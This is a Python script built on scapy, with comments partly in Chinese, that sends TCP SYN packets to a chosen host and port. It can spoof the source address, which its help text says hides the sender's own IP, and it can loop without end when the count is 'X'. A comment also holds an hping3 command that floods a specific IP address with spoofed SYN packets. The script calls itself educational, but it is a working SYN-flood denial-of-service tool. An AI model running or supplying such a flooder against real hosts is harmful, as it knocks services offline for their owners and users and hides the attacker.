#!/usr/bin/env python3
# coding=utf-8
#sudo hping3 -I eth0 -a 115.159.115.103 -S 115.159.115.103 -p 80 -i u100
import sys
import random
import logging # This and the following line are used to omit the IPv6 error displayed by importing scapy.
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import argparse
import os
import urllib2

if os.getuid() != 0: #检查是否使用了root用户 
    print("You need to run this program as root for it to function correctly.")
    sys.exit(1)

parser = argparse.ArgumentParser(description=
        'This educational tool sends SYN requests to the target specified in the arguments.') # This and preceding 4 lines used to control the arguments entered in the CLI.
parser.add_argument('-d', action="store",dest='destination',
        help='要发送SYN包的目标地址')
parser.add_argument('-s', action="store",dest='source',
        help='可选,用于隐藏本机IP')
parser.add_argument('-c', action="store",dest='count',
        help='要发送的SYN包的个数')
parser.add_argument('-p', action="store",dest='port',
        help='目的主机端口号')

args = parser.parse_args()
if len(sys.argv) == 1: #没有参数输入就打印help文档
    parser.print_help()
    sys.exit(1)

args = vars(args) # converts the arguments into dictionary format for easier retrieval.

if ((not args['destination']) or (not args['port'])
        or (not args['count'])):
    parser.print_help()
    sys.exit(1)

if not args['source']:
    p = IP(dst="www.baidu.com")
    args['source'] = p.src

iterationCount = 0 # variable used to control the while loop for the amount of times a packet is sent.
if args['count'] == "X" or args['count'] == "x": # If the user entered an X or x into the count argument (wants unlimited SYN segments sent)
    while (True):
        a=IP(src=args['source'],dst=args['destination'])/TCP(flags="S",  sport=RandShort(),  dport=int(args['port'])) # Creates the packet and assigns it to variable a
        send(a,  verbose=0) # Sends the Packet
        iterationCount = iterationCount + 1
        print(str(iterationCount) + " Packet Sent")
else: # executed if the user defined an amount of segments to send.
    while iterationCount < int(args['count']):
        a=IP(src=args['source'], dst=args['destination'])/TCP(flags="S", sport=RandShort(), dport=int(args['port'])) # Creates the packet and assigns it to variable a
        send(a,  verbose=0) # Sends the Packet
        iterationCount = iterationCount + 1
        print(str(iterationCount) + " Packet Sent")
print("All packets successfully sent.")
